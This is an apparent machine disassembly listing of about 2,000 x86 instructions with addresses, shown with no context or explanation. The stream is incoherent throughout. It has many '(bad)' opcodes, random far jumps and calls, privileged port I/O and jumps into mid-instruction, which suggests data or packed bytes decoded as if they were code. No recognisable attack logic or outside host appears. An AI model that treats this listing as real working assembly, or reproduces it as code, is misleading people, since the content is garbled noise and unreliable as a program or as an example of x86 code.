  415333:	mov    ds:0x4ee52d53,eax
  415338:	jp     0x415317
  41533a:	and    al,0x78
  41533c:	rol    bh,1
  41533e:	jo     0x41537c
  415340:	push   0x73
  415342:	add    eax,0x4b8b8dc7
  415347:	sub    eax,0xf6f90d94
  41534c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41534d:	inc    esi
  41534e:	jns    0x41539c
  415350:	pop    eax
  415351:	xchg   esi,eax
  415352:	push   ss
  415353:	pop    ebx
  415354:	pop    ss
  415355:	pop    ebx
  415356:	sub    BYTE PTR [esi+eax*1-0x6561cc33],ah
  41535d:	fnsave [edi+0x49548337]
  415363:	adc    BYTE PTR [esi*4-0x19d54247],al
  41536a:	and    edi,DWORD PTR [eax+edx*1]
  41536d:	fsubr  QWORD PTR [edi-0x5a]
  415370:	inc    eax
  415371:	clc    
  415372:	mov    WORD PTR [edx+ebx*2-0x20f15fee],gs
  415379:	cmp    DWORD PTR [edi],eax
  41537b:	jg     0x415355
  41537d:	loope  0x41532e
  41537f:	popf   
  415380:	xor    BYTE PTR [edx-0x73],0x43
  415384:	mov    edx,0xc6c261b2
  415389:	mov    dh,0x6e
  41538b:	cmp    DWORD PTR [ebp-0x53d9a1a4],esi
  415391:	fcom   QWORD PTR [edi-0x172c327c]
  415397:	dec    ecx
  415398:	push   esp
  415399:	xchg   esp,eax
  41539a:	(bad)  
  41539b:	(bad)  
  41539c:	and    eax,0x77c407d6
  4153a1:	loope  0x415339
  4153a3:	outs   dx,DWORD PTR ds:[esi]
  4153a4:	mov    edi,0xd4467501
  4153a9:	inc    esi
  4153aa:	inc    eax
  4153ab:	lods   eax,DWORD PTR ds:[esi]
  4153ac:	cmc    
  4153ad:	daa    
  4153ae:	push   ebp
  4153af:	and    ah,cl
  4153b1:	inc    esp
  4153b2:	pop    ebp
  4153b3:	jmp    0x4b71fc7e
  4153b8:	xchg   ebp,eax
  4153b9:	pop    esi
  4153ba:	ret    0x84ab
  4153bd:	imul   edx,ebx,0xa0775baa
  4153c3:	repnz fdivr st(1),st
  4153c6:	ret    
  4153c7:	outs   dx,BYTE PTR ds:[esi]
  4153c8:	(bad)  
  4153c9:	aam    0x11
  4153cb:	adc    bh,BYTE PTR [edx]
  4153cd:	adc    ch,BYTE PTR [eax-0x454efc41]
  4153d3:	pop    ecx
  4153d4:	pop    eax
  4153d5:	lods   al,BYTE PTR ds:[esi]
  4153d6:	push   es
  4153d7:	jmp    0x415440
  4153d9:	jb     0x415433
  4153db:	xchg   ebx,eax
  4153dc:	std    
  4153dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153de:	adc    al,0x69
  4153e0:	xchg   ebp,eax
  4153e1:	push   0x15
  4153e3:	sub    ah,BYTE PTR [ebx+0x79]
  4153e6:	xchg   ebx,eax
  4153e7:	sbb    dl,BYTE PTR [edi-0x3a7aa154]
  4153ed:	call   0x4763:0xc8874142
  4153f4:	les    ecx,FWORD PTR [eax-0xe25b92b]
  4153fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153fb:	jbe    0x4153a7
  4153fd:	sbb    edi,DWORD PTR [esi-0x3b615066]
  415403:	mov    ebp,DWORD PTR ds:0xc729b2c3
  415409:	jae    0x4153f5
  41540b:	not    esp
  41540d:	xlat   BYTE PTR ds:[ebx]
  41540e:	xor    dh,BYTE PTR [ebp-0x6f6b93ae]
  415414:	xchg   edi,eax
  415415:	int    0x80
  415417:	jmp    0x4153eb
  415419:	ret    0xfad
  41541c:	add    ebx,DWORD PTR [esi]
  41541e:	(bad)  
  415420:	add    eax,0x34cd85d6
  415425:	pop    esp
  415426:	(bad)  
  415427:	mov    al,ds:0x464a123e
  41542c:	inc    ebx
  41542d:	mov    ah,0x81
  41542f:	dec    edx
  415430:	outs   dx,BYTE PTR ds:[esi]
  415431:	adc    dl,BYTE PTR [esi-0x73a30eb0]
  415437:	pop    esp
  415438:	adc    BYTE PTR [edx],al
  41543a:	loope  0x41545f
  41543c:	stos   BYTE PTR es:[edi],al
  41543d:	in     al,0x59
  41543f:	aam    0xf2
  415441:	out    dx,eax
  415442:	and    edi,eax
  415444:	cmp    cl,BYTE PTR [ebp-0x74]
  415447:	push   cs
  415448:	pop    ecx
  415449:	inc    edx
  41544a:	sar    DWORD PTR [esi-0x2f],0xc4
  41544e:	(bad)  
  41544f:	retf   
  415450:	jl     0x415479
  415452:	repnz dec esp
  415454:	sbb    cl,cl
  415456:	mul    DWORD PTR [ecx]
  415458:	fst    st(5)
  41545a:	inc    esi
  41545b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41545c:	(bad)
  415460:	fwait
  415461:	je     0x4154c7
  415463:	or     al,0x94
  415465:	sbb    al,BYTE PTR [edx-0x74]
  415468:	sub    ebx,esi
  41546a:	test   eax,0x9aca9657
  41546f:	mov    bh,0x25
  415471:	(bad)  
  415473:	das    
  415474:	popf   
  415475:	add    BYTE PTR [edi],bh
  415477:	mov    cl,dl
  415479:	jmp    0x415436
  41547b:	es ret 
  41547d:	lock cdq 
  41547f:	jp     0x415423
  415481:	retf   0x1925
  415484:	cmp    al,0x38
  415486:	outs   dx,DWORD PTR ds:[esi]
  415487:	loope  0x4154dd
  415489:	sahf   
  41548a:	push   ss
  41548b:	lods   eax,DWORD PTR ds:[esi]
  41548c:	or     al,0x8b
  41548e:	out    dx,eax
  41548f:	push   0xffffff95
  415491:	jmp    0x415500
  415493:	lds    ecx,FWORD PTR [ebp-0xf6d7c2]
  415499:	mov    bl,0x89
  41549b:	je     0x4154f1
  41549d:	jle    0x4154e7
  41549f:	push   edx
  4154a0:	fld    DWORD PTR [esi+0x40]
  4154a3:	outs   dx,DWORD PTR ds:[esi]
  4154a4:	fistp  QWORD PTR [esi+0x7]
  4154a7:	loop   0x4154bd
  4154a9:	cld    
  4154aa:	sub    edi,edi
  4154ac:	mov    al,ds:0x2aa788fb
  4154b1:	cmp    eax,0xf172d493
  4154b6:	sub    eax,esp
  4154b8:	jle    0x415489
  4154ba:	xchg   BYTE PTR [esi+0x3f03fa30],dl
  4154c0:	cmp    al,0x64
  4154c2:	jg     0x4154c0
  4154c4:	push   edi
  4154c5:	xor    eax,0xec6da199
  4154ca:	xor    bl,BYTE PTR [edx+0x39f3fba9]
  4154d0:	(bad)  
  4154d2:	mov    ?,WORD PTR [ecx-0x42]
  4154d5:	inc    eax
  4154d6:	sbb    edx,DWORD PTR [eax]
  4154d8:	out    0xdf,al
  4154da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154db:	cmp    bl,ch
  4154dd:	mov    cl,0xee
  4154df:	xor    DWORD PTR [edx+0x3ea2fe7c],eax
  4154e5:	retf   
  4154e6:	cdq    
  4154e7:	addr16 out 0x15,al
  4154ea:	bound  eax,QWORD PTR [esi+0x4516a2a7]
  4154f0:	dec    ebx
  4154f1:	lahf   
  4154f2:	push   edi
  4154f3:	push   0x663a245d
  4154f8:	xchg   BYTE PTR ds:0x6c662b01,bl
  4154fe:	xchg   edx,eax
  4154ff:	or     BYTE PTR [ecx-0x26],ah
  415502:	push   edx
  415503:	push   eax
  415504:	fsubrp st(1),st
  415506:	imul   esp,DWORD PTR [edx-0x3d048c37],0xffffffed
  41550d:	enter  0x22bd,0x8c
  415511:	les    esp,FWORD PTR [esi-0x6f988690]
  415517:	xchg   esp,eax
  415518:	adc    ch,BYTE PTR [esi]
  41551a:	mov    ds,WORD PTR ds:0x77ecae62
  415520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415521:	mov    al,0x23
  415523:	dec    eax
  415524:	enter  0xabd6,0x47
  415528:	add    ebp,ebp
  41552a:	cwde   
  41552b:	dec    esi
  41552c:	mov    ch,0xb
  41552e:	loop   0x415580
  415530:	xchg   esp,eax
  415531:	cmp    ecx,edx
  415533:	call   FWORD PTR [ebx+0x3a]
  415536:	hlt    
  415537:	push   edx
  415538:	jg     0x4155a9
  41553a:	cdq    
  41553b:	push   ds
  41553c:	jl     0x415598
  41553e:	mov    ah,0xab
  415540:	aad    0xc2
  415542:	xchg   esp,eax
  415543:	retf   
  415544:	fsub   QWORD PTR [eax]
  415546:	push   ebp
  415547:	loopne 0x4154f9
  415549:	xchg   BYTE PTR [ecx-0x1b],dh
  41554c:	dec    ebx
  41554d:	mov    ecx,0xaaa3868b
  415552:	mov    al,0x2c
  415554:	jbe    0x4155ca
  415556:	(bad)  
  415557:	ja     0x41557e
  415559:	push   esp
  41555a:	inc    ebp
  41555b:	ja     0x415593
  41555d:	add    esp,DWORD PTR [ebp-0xa78b09d]
  415563:	pop    ds
  415564:	in     al,dx
  415565:	mov    ecx,DWORD PTR [edi-0x77]
  415568:	and    ebx,esp
  41556a:	stc    
  41556b:	mov    al,ds:0xbe0070b0
  415570:	dec    ebp
  415571:	dec    eax
  415572:	cmp    BYTE PTR [ebx-0x72a7864f],ah
  415578:	xlat   BYTE PTR ds:[ebx]
  415579:	xor    bl,BYTE PTR ss:[ecx+0x32]
  41557d:	mov    ds:0x76ffe9b,al
  415582:	fiadd  DWORD PTR [ecx]
  415584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415585:	aam    0x30
  415587:	gs (bad) 
  415589:	or     eax,0x4a2731be
  41558e:	scas   al,BYTE PTR es:[edi]
  41558f:	mov    dh,0x6e
  415591:	mov    ch,0x4a
  415593:	lahf   
  415594:	rcl    BYTE PTR [edi+0x2e],1
  415597:	das    
  415598:	mov    dl,0x6d
  41559a:	mov    DWORD PTR [eax+ecx*2+0x25],eax
  41559e:	aas    
  41559f:	(bad)  
  4155a0:	loop   0x41553e
  4155a2:	stos   DWORD PTR es:[edi],eax
  4155a3:	je     0x415618
  4155a5:	push   ecx
  4155a6:	daa    
  4155a7:	sar    BYTE PTR [edi],1
  4155a9:	out    0x12,eax
  4155ab:	popf   
  4155ac:	jle    0x41555b
  4155ae:	cmc    
  4155af:	clc    
  4155b0:	pop    ecx
  4155b1:	push   edx
  4155b2:	ds pushfw 
  4155b5:	and    BYTE PTR [esi*2+0x6f472562],cl
  4155bc:	add    BYTE PTR [edx-0xcc259fe],ah
  4155c2:	test   BYTE PTR [edi+0x78592da3],cl
  4155c8:	mov    ds:0x8675c9b2,eax
  4155cd:	hlt    
  4155ce:	pop    ebx
  4155cf:	lds    edi,FWORD PTR [ebx-0x108bb633]
  4155d5:	repnz add edi,DWORD PTR [ebx]
  4155d8:	mov    dl,0xae
  4155da:	sbb    DWORD PTR [ebx],ebx
  4155dc:	cld    
  4155dd:	fsub   QWORD PTR [esi-0x46bb4c6]
  4155e3:	mov    ebx,0xe33f480
  4155e8:	pop    esp
  4155e9:	test   DWORD PTR [eax+0xa1a0625],ebp
  4155ef:	(bad)  
  4155f0:	in     al,dx
  4155f1:	fiadd  DWORD PTR [eax]
  4155f3:	mov    dl,0x6f
  4155f5:	dec    esi
  4155f6:	adc    eax,0x6a49815e
  4155fb:	jnp    0x4155ae
  4155fd:	ds xchg ecx,eax
  4155ff:	sbb    al,BYTE PTR [ebx]
  415601:	fwait
  415602:	jmp    0xe7bc:0x31876bf6
  415609:	jnp    0x4155a9
  41560b:	dec    ecx
  41560c:	mov    BYTE PTR [edx],0x66
  41560f:	int    0x0
  415611:	add    esi,esi
  415613:	jae    0x4155ae
  415615:	jne    0x415679
  415617:	dec    edi
  415618:	add    BYTE PTR [ebx],bl
  41561a:	data16 lahf 
  41561c:	sub    BYTE PTR [esi],al
  41561e:	fiadd  DWORD PTR [esi+edi*4-0x71]
  415622:	xchg   ecx,eax
  415623:	jo     0x41567d
  415625:	add    BYTE PTR [eax+0x63],bl
  415628:	mov    DWORD PTR [eax+0x3a0a5d21],0x36a3f18f
  415632:	mov    BYTE PTR [edi-0x69],dl
  415635:	adc    eax,0xf24fa68b
  41563a:	fisttp QWORD PTR [ecx+0x23]
  41563d:	cmp    ch,BYTE PTR [ebp-0x1ae52ea1]
  415643:	adc    eax,0xb38d14bc
  415648:	mov    DWORD PTR [esi],0x97b0083
  41564e:	xor    bh,BYTE PTR [ecx+0x36729b70]
  415654:	fdivr  QWORD PTR [edi+0x3]
  415657:	cmp    eax,0x7a2af1bc
  41565c:	test   DWORD PTR [esi+0x49d16825],ebp
  415662:	inc    eax
  415663:	addr16 (bad) 
  415665:	mov    al,ds:0x60be6d76
  41566a:	cmp    ah,al
  41566c:	push   0xffffffbd
  41566e:	push   esi
  41566f:	ins    DWORD PTR es:[edi],dx
  415670:	adc    dl,BYTE PTR [edi]
  415672:	je     0x4156b0
  415674:	mul    DWORD PTR [edi-0x38]
  415677:	inc    ebp
  415678:	sar    BYTE PTR [ebx-0x4aa87cb7],0x16
  41567f:	rcl    DWORD PTR [ecx-0x30],1
  415682:	push   si
  415684:	xchg   esp,eax
  415685:	(bad)  
  415686:	add    eax,0x3a0f69e9
  41568b:	mov    ss,WORD PTR [ebx+ecx*8]
  41568e:	imul   esp,DWORD PTR [esi],0x775f1b91
  415694:	push   ecx
  415695:	pop    esp
  415696:	stos   DWORD PTR es:[edi],eax
  415697:	pushf  
  415698:	rcl    ebx,cl
  41569a:	and    bl,BYTE PTR [edi-0x175d45c4]
  4156a0:	cmp    BYTE PTR [ebx+esi*8],al
  4156a3:	aad    0x85
  4156a5:	and    DWORD PTR [esi-0x5e],0x955c71b8
  4156ac:	cmp    edi,DWORD PTR [ebp-0x9]
  4156af:	imul   esi,DWORD PTR [edi+0x37dc36da],0xffffffa4
  4156b6:	xchg   esi,eax
  4156b7:	out    0x3c,al
  4156b9:	xor    DWORD PTR [edi-0x6346c7e8],ebp
  4156bf:	shl    DWORD PTR [edx-0x39],cl
  4156c2:	mov    edx,0xf2e15a76
  4156c7:	adc    eax,0x5bd8e17
  4156cc:	inc    esi
  4156cd:	outs   dx,DWORD PTR ds:[esi]
  4156ce:	ret    0xe2bc
  4156d1:	dec    edx
  4156d2:	js     0x415734
  4156d4:	les    ebp,FWORD PTR [edi+0x35]
  4156d7:	inc    eax
  4156d8:	dec    ecx
  4156d9:	sub    DWORD PTR [ecx-0x51],esp
  4156dc:	add    al,0x54
  4156de:	pop    ecx
  4156df:	ret    
  4156e0:	mov    ds:0x90d9dfae,al
  4156e5:	cmc    
  4156e6:	mov    dh,0xe7
  4156e8:	inc    ebp
  4156e9:	xor    DWORD PTR ds:0x67733274,ecx
  4156ef:	rcr    DWORD PTR [edi],1
  4156f1:	xchg   esp,eax
  4156f2:	jmp    0xdb00:0x7059a4b7
  4156f9:	add    cl,bh
  4156fb:	pop    esi
  4156fc:	imul   edx,DWORD PTR ds:0xe63ba815,0xb8a2b719
  415706:	loope  0x415778
  415708:	add    bh,0xaa
  41570b:	mov    eax,ds:0x266bb8cf
  415710:	jnp    0x4156aa
  415712:	fnstsw WORD PTR [edi-0x27]
  415715:	sbb    eax,0x7b85819
  41571a:	and    ch,BYTE PTR [edx-0x78]
  41571d:	jmp    0x2af5:0xdabf2a77
  415724:	push   es
  415725:	fidiv  WORD PTR [edi+0x2a17427b]
  41572b:	popf   
  41572c:	inc    esi
  41572d:	sbb    eax,0x81b3b095
  415732:	scas   al,BYTE PTR es:[edi]
  415733:	int3   
  415734:	push   0xffffffd9
  415736:	mov    ds:0xf0d0daf7,eax
  41573b:	xchg   edx,eax
  41573c:	adc    eax,0x1b10ef6f
  415741:	pop    es
  415742:	mov    DWORD PTR [ebx-0x16f4cd87],edx
  415748:	ds jnp 0x4156f4
  41574b:	mov    BYTE PTR [edx-0x26daf44c],ch
  415751:	lock stc 
  415753:	add    al,0x58
  415755:	dec    eax
  415756:	mov    ebx,0x5a393724
  41575b:	retf   0x699f
  41575e:	fst    st(0)
  415760:	cmp    eax,0xb53f6696
  415765:	sub    BYTE PTR [esi-0x39],ch
  415768:	jecxz  0x415742
  41576a:	push   0x42
  41576c:	into   
  41576d:	jnp    0x415761
  41576f:	aaa    
  415770:	lea    edi,[esi-0x1ee46034]
  415776:	mov    eax,edi
  415778:	(bad)  
  415779:	outs   dx,BYTE PTR ds:[esi]
  41577a:	jb     0x41574d
  41577c:	sub    BYTE PTR [esi-0x53],dh
  41577f:	push   edx
  415780:	jmp    0x41577e
  415782:	test   BYTE PTR [ebp-0x796b1e27],bl
  415788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415789:	add    eax,0x8ca13c03
  41578e:	fwait
  41578f:	mov    edx,0x8378a7f1
  415794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415795:	or     eax,0xa67450ef
  41579a:	out    dx,eax
  41579b:	stos   DWORD PTR es:[edi],eax
  41579c:	push   ds
  41579d:	pop    ds
  41579e:	mov    ebp,DWORD PTR [edi]
  4157a0:	sub    bl,BYTE PTR [ebx]
  4157a2:	aad    0x86
  4157a4:	sub    ch,BYTE PTR [si-0x6ff1]
  4157a9:	lds    ebx,FWORD PTR [edi-0x7e82aa48]
  4157af:	in     al,dx
  4157b0:	fs xchg ebp,eax
  4157b2:	push   ss
  4157b3:	cmp    BYTE PTR [eax+0x2f8f95d3],0x44
  4157ba:	pop    esi
  4157bb:	mov    ds:0x82a71902,al
  4157c0:	bound  ebp,QWORD PTR [ecx]
  4157c2:	repz mov edx,edx
  4157c5:	lods   eax,DWORD PTR ds:[esi]
  4157c6:	(bad)  
  4157c7:	pop    ecx
  4157c8:	shl    ebp,0xc0
  4157cb:	enter  0x42ca,0x3b
  4157cf:	dec    ebx
  4157d0:	mov    ds:0x51697dca,eax
  4157d5:	xchg   ebp,eax
  4157d6:	or     cl,bl
  4157d8:	test   BYTE PTR [esi],bh
  4157da:	or     BYTE PTR [ebp-0x385ee91f],dl
  4157e0:	call   0x99e9:0xa5c69c85
  4157e7:	clc    
  4157e8:	int3   
  4157e9:	cmc    
  4157ea:	sbb    eax,0xb161ba2c
  4157ef:	(bad)  
  4157f1:	cmp    cl,cl
  4157f3:	adc    ebp,DWORD PTR [eax+eiz*8]
  4157f6:	pop    esp
  4157f7:	into   
  4157f8:	jb     0x4157aa
  4157fa:	lahf   
  4157fb:	or     BYTE PTR [edx+0x763dfe05],cl
  415801:	inc    edi
  415802:	mov    fs,WORD PTR [ebp+0x8c66772]
  415808:	inc    esp
  415809:	lods   eax,DWORD PTR ds:[esi]
  41580a:	push   esp
  41580b:	daa    
  41580c:	sub    DWORD PTR [eax+0x44acd777],eax
  415812:	pop    ss
  415813:	jmp    0x3eeb:0xdaeb214d
  41581a:	call   0xca5d05a2
  41581f:	loope  0x415875
  415821:	dec    ebx
  415822:	lods   al,BYTE PTR ds:[esi]
  415823:	cmp    DWORD PTR [ecx-0x273b5942],0x19d9e1cb
  41582d:	push   ds
  41582e:	cmp    DWORD PTR [esi+ebx*8],ebp
  415831:	ins    BYTE PTR es:[edi],dx
  415832:	lea    eax,[ebx+ebx*4+0x2185531b]
  415839:	add    eax,ebx
  41583b:	das    
  41583c:	sbb    esp,DWORD PTR [ecx]
  41583e:	test   BYTE PTR [edx+ebx*8+0x20e9a139],dh
  415845:	inc    ecx
  415846:	sbb    ebp,DWORD PTR [edi]
  415848:	rol    edi,cl
  41584a:	das    
  41584b:	call   0x9e0f:0x402c679
  415852:	push   esi
  415853:	xchg   ecx,eax
  415854:	pop    edx
  415855:	mov    dh,0x3b
  415857:	in     al,0xd6
  415859:	and    cl,BYTE PTR [ecx]
  41585b:	jg     0x41587e
  41585d:	sbb    al,0xc
  41585f:	inc    ebx
  415860:	sbb    BYTE PTR [edi+eiz*1-0x50cc86a],ch
  415867:	jb     0x415845
  415869:	aas    
  41586a:	outs   dx,BYTE PTR ds:[esi]
  41586b:	fidivr DWORD PTR [ebx-0x6f]
  41586e:	sub    al,0xb7
  415870:	fadd   st,st(6)
  415872:	(bad)  
  415873:	call   DWORD PTR [esp+edi*1-0x1d4882b3]
  41587a:	sub    esi,eax
  41587c:	sbb    BYTE PTR [ebx-0x66b06d17],bl
  415882:	mov    edi,0xc6024d0a
  415887:	pushf  
  415888:	push   ds
  415889:	jge    0x4158a3
  41588b:	mov    WORD PTR [ebx],gs
  41588d:	leave  
  41588e:	adc    al,bl
  415890:	mov    edx,0xc7ffa248
  415895:	sbb    bl,BYTE PTR [edi-0x7d]
  415898:	out    dx,eax
  415899:	dec    edx
  41589a:	jae    0x415876
  41589c:	outs   dx,DWORD PTR ds:[esi]
  41589d:	stos   DWORD PTR es:[edi],eax
  41589e:	frstor [ecx]
  4158a0:	cmp    esi,DWORD PTR [eax+0x58]
  4158a3:	aad    0x46
  4158a5:	outs   dx,DWORD PTR ds:[esi]
  4158a6:	sbb    eax,0xca04cc3e
  4158ab:	sub    esp,DWORD PTR [ebp+0x53cb1afa]
  4158b1:	out    0xf0,al
  4158b3:	and    eax,0xd6ffe837
  4158b8:	add    dl,al
  4158ba:	mov    cl,BYTE PTR ds:0xb28420f4
  4158c0:	adc    al,BYTE PTR [edx+0xb10eb1b]
  4158c6:	sbb    al,0x62
  4158c8:	iret   
  4158c9:	sbb    DWORD PTR [ecx],0xb536de54
  4158cf:	push   ecx
  4158d0:	push   ss
  4158d1:	mov    ?,WORD PTR [esi+0x3a]
  4158d4:	mov    bh,0x2a
  4158d6:	or     eax,0x9e8adfb7
  4158db:	push   es
  4158dc:	out    0x39,al
  4158de:	pop    esp
  4158df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158e0:	repnz mov esi,0x84b9c985
  4158e6:	cmc    
  4158e7:	sahf   
  4158e8:	neg    BYTE PTR [ebx+0x66]
  4158eb:	repnz mov dh,0x92
  4158ee:	sub    cl,BYTE PTR [ebx-0x1d]
  4158f1:	call   0xb87e:0x675eb7f2
  4158f8:	fsubp  st(5),st
  4158fa:	mov    BYTE PTR [eax],bl
  4158fc:	retf   0xd7ed
  4158ff:	dec    edx
  415900:	xchg   esi,eax
  415901:	shl    BYTE PTR [edi-0x167a4bd2],cl
  415907:	popa   
  415908:	out    0x22,al
  41590a:	(bad)  
  41590b:	jno    0x415954
  41590d:	xor    eax,DWORD PTR [esi-0x270068d8]
  415913:	mul    al
  415915:	jb     0x4158ac
  415917:	dec    ebx
  415918:	add    esi,DWORD PTR [ebx+0x28042f56]
  41591e:	cdq    
  41591f:	sbb    ch,BYTE PTR [edi+0x44da6067]
  415925:	push   ebp
  415926:	mov    bh,0xd8
  415928:	xor    al,0xb4
  41592a:	cmp    al,0x2
  41592c:	sbb    al,0xc7
  41592e:	push   ebx
  41592f:	xor    edx,DWORD PTR [edi-0x73]
  415932:	dec    edx
  415933:	out    dx,al
  415934:	sub    eax,0x15737918
  415939:	xor    BYTE PTR [ebp+ecx*4+0x71df57e8],0xe8
  415941:	dec    esp
  415942:	ret    0xe7ae
  415945:	and    BYTE PTR [ebp-0x7c3cec24],al
  41594b:	retf   0x7ad2
  41594e:	add    BYTE PTR [edx],bh
  415950:	add    al,0xdc
  415952:	pop    ds
  415953:	enter  0xdc02,0xfe
  415957:	add    DWORD PTR [edx],0x56a510fb
  41595d:	push   ds
  41595e:	fs inc edx
  415960:	das    
  415961:	pop    esp
  415962:	jg     0x41590b
  415964:	push   es
  415965:	cmp    ebx,DWORD PTR [ebp-0x1376d302]
  41596b:	pop    es
  41596c:	inc    ebx
  41596d:	and    bh,BYTE PTR ds:0xa2b1fdbe
  415973:	mov    ebx,0x883860e4
  415978:	fst    QWORD PTR [ecx+edi*8+0x529a3b42]
  41597f:	in     eax,0xb9
  415981:	js     0x41592e
  415983:	and    edi,DWORD PTR [edx-0x44fb282d]
  415989:	cmp    eax,DWORD PTR [esi+0x5e]
  41598c:	sbb    DWORD PTR [ecx],eax
  41598e:	stos   DWORD PTR es:[edi],eax
  41598f:	mov    BYTE PTR [esi],bh
  415991:	push   ebp
  415992:	mov    cl,0x81
  415994:	inc    edx
  415995:	mov    ecx,0xa76ff22
  41599a:	lahf   
  41599b:	lods   al,BYTE PTR ds:[esi]
  41599c:	aas    
  41599d:	mov    ds:0x8108b04,al
  4159a2:	push   ebp
  4159a3:	outs   dx,DWORD PTR ds:[esi]
  4159a4:	es cld 
  4159a6:	ss xchg ecx,eax
  4159a8:	stc    
  4159a9:	xchg   esi,eax
  4159aa:	push   edx
  4159ab:	imul   eax,DWORD PTR [esi*8+0x291a5874],0xffffffbd
  4159b3:	pop    ecx
  4159b4:	clc    
  4159b5:	mov    esi,0x709c9da
  4159ba:	push   cs
  4159bb:	fsubrp st(7),st
  4159bd:	sub    ecx,DWORD PTR [ecx-0x2b4b1ce5]
  4159c3:	pop    eax
  4159c4:	add    eax,0xb02aefcd
  4159c9:	addr16 mov ah,0xe4
  4159cc:	imul   esi
  4159ce:	add    eax,0x9dc3e4a0
  4159d3:	mov    bl,dh
  4159d5:	sub    al,0xab
  4159d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159d8:	jg     0x415a46
  4159da:	test   al,0x71
  4159dc:	jle    0x415a26
  4159de:	js     0x41598d
  4159e0:	outs   dx,BYTE PTR ds:[esi]
  4159e1:	fidivr WORD PTR [ecx]
  4159e3:	in     al,0xe4
  4159e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e7:	mov    esi,0x1dcfab0d
  4159ec:	(bad)  [esi+0x3f]
  4159ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159f0:	mov    esp,0xfc0d47ed
  4159f6:	adc    DWORD PTR [edi],edx
  4159f8:	das    
  4159f9:	inc    ecx
  4159fa:	aad    0x9b
  4159fc:	jmp    0x415a7b
  4159fe:	cmp    DWORD PTR [ebp+esi*8-0x73659a66],esi
  415a05:	jl     0x415a01
  415a07:	(bad)  
  415a08:	lods   al,BYTE PTR ds:[esi]
  415a09:	mov    bl,0xfd
  415a0b:	das    
  415a0c:	push   cs
  415a0d:	xor    eax,DWORD PTR [esi-0x23]
  415a10:	mov    ecx,0xefba68b0
  415a15:	fsub   DWORD PTR [edx-0x4c]
  415a18:	mov    eax,ds:0xdaed7cb7
  415a1d:	inc    edx
  415a1e:	push   esp
  415a1f:	mov    ds:0x75c43875,eax
  415a24:	test   ah,bl
  415a26:	add    BYTE PTR [ecx+eiz*8+0x5a],ch
  415a2a:	push   ecx
  415a2b:	in     al,dx
  415a2c:	xor    eax,DWORD PTR [ecx+0x7e]
  415a2f:	sti    
  415a30:	(bad)  
  415a31:	xor    esp,DWORD PTR [edi]
  415a33:	pop    ebp
  415a34:	mov    ebx,?
  415a36:	repz mov eax,0xe400434a
  415a3c:	das    
  415a3d:	outs   dx,DWORD PTR ds:[esi]
  415a3e:	js     0x415a0f
  415a40:	xor    bl,BYTE PTR [ebx]
  415a42:	sbb    eax,0x9a65943f
  415a47:	ja     0x18c2f2c3
  415a4d:	lock pushf 
  415a4f:	pop    esp
  415a50:	cmp    al,0xb7
  415a52:	xor    bh,BYTE PTR [eax+0x5f]
  415a55:	push   esp
  415a56:	mov    BYTE PTR [esi+0x7f860502],0xda
  415a5d:	retf   
  415a5e:	cmp    ebx,0x7c25f6f5
  415a64:	dec    edi
  415a65:	(bad)  
  415a66:	cmc    
  415a67:	fnsave [ecx+0x4b]
  415a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a6b:	jge    0x415a38
  415a6d:	ins    DWORD PTR es:[edi],dx
  415a6e:	stc    
  415a6f:	lahf   
  415a70:	push   edi
  415a71:	shr    DWORD PTR [ecx+0x1f],0x3e
  415a75:	push   esp
  415a76:	mov    bh,0xd2
  415a78:	xor    BYTE PTR [esi+0x3d],ah
  415a7b:	mov    edi,0xfebf697
  415a80:	fdiv   DWORD PTR [edx+eax*1+0x62]
  415a84:	ins    BYTE PTR es:[edi],dx
  415a85:	ds into 
  415a87:	pop    edi
  415a88:	and    bh,dl
  415a8a:	or     ah,BYTE PTR [esi+0x25]
  415a8d:	scas   al,BYTE PTR es:[edi]
  415a8e:	mov    DWORD PTR [ebp+0x43],edx
  415a91:	xchg   edx,eax
  415a92:	and    DWORD PTR [eax+esi*2-0xa],eax
  415a96:	dec    ebx
  415a97:	std    
  415a98:	imul   esi,DWORD PTR [eax+ebp*1],0x2e98bbe7
  415a9f:	inc    eax
  415aa0:	test   al,0x2d
  415aa2:	popf   
  415aa3:	retf   0xbb3
  415aa6:	dec    ecx
  415aa7:	mov    ecx,0x64d9f53e
  415aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aad:	mov    esp,0xd4b1dc44
  415ab2:	loope  0x415a71
  415ab4:	xlat   BYTE PTR ds:[ebx]
  415ab5:	and    al,0x8e
  415ab7:	ds stc 
  415ab9:	cmp    eax,0x4b240376
  415abe:	add    DWORD PTR [ebx],ecx
  415ac0:	jmp    0x415aa3
  415ac2:	pop    es
  415ac3:	cli    
  415ac4:	or     eax,0x5be8ee06
  415ac9:	not    DWORD PTR [eax+esi*2+0x7fe2ba79]
  415ad0:	sbb    al,0x78
  415ad2:	fwait
  415ad3:	bt     DWORD PTR [ecx],edi
  415ad6:	and    bl,al
  415ad8:	mov    ds:0xdcc5504e,eax
  415add:	out    0xc,al
  415adf:	adc    ch,cl
  415ae1:	mov    eax,ds:0x44383c1b
  415ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae7:	jbe    0x415b29
  415ae9:	mov    dl,0x1c
  415aeb:	adc    al,0xa9
  415aed:	sbb    eax,0xa8705283
  415af2:	icebp  
  415af3:	jne    0x415a90
  415af5:	push   edi
  415af6:	lahf   
  415af7:	ins    DWORD PTR es:[edi],dx
  415af8:	mov    bl,BYTE PTR [ebx]
  415afa:	pop    esp
  415afb:	push   edx
  415afc:	dec    ecx
  415afd:	xor    eax,0xe6d63e63
  415b02:	out    dx,eax
  415b03:	add    eax,0x4b8d0fc8
